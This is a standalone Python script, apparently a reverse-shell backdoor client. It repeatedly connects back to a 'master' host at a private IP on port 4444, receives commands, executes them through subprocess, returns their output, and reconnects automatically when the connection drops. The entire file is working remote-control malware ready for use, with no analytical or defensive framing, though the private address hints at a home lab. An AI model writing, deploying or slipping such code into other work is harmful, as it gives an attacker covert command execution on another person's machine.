import socket
import subprocess
import os
import time

# Connect back to your (master) machine
server_ip = '192.168.56.1'  # Master machine's IP
server_port = 4444

# Function to connect to the master server
def connect_to_master():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
            print(f"Connected to {server_ip}:{server_port}")
            return s
        except (socket.timeout, socket.error):
            print(f"Connection failed, retrying in 5 seconds...")
            time.sleep(5)

# Attempt to connect to the master
s = connect_to_master()

while True:
    try:
        # Receive a command
        command = s.recv(1024).decode('utf-8')
        if command.lower() == "exit":
            break
        if command.startswith("cd "):
            os.chdir(command[3:])
        else:
            output = subprocess.getoutput(command)
            s.send(output.encode('utf-8'))

    except socket.error:
        print("Connection lost. Reconnecting...")
        s.close()
        s = connect_to_master()

s.close()
